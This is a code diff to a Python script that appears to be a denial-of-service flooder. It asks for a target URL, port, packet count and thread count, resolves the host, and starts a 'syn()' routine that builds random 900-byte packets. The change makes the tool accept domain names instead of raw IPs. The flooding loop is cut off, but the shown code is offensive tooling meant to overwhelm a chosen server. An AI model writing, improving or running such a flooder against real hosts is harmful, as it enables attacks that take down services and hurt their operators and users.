@@ -19,12 +19,12 @@ print(colored("""
                                               |___/ 
 """,'green'))
 
-ip = str(input(colored("_IP: ",'green')))
+url = str(input(colored("_URL: ",'green')))
 port = int(input(colored("_Port: ",'green')))
 packet = int(input(colored("_Packet: ",'green')))
 thread = int(input(colored("_Threads: ", 'green')))
+ip = socket.gethostbyname(url)
 time.sleep(1)
-
 os.system('cls')
 print(colored("""
     |       .     .                   '||       ||                   . . . 
@@ -36,7 +36,7 @@ print(colored("""
 """,'green'))
 
 print(colored("###########################################################################",'green'))
-
+time.sleep(1.5)
 def syn():
     num = random._urandom(900)
     count = int(0)
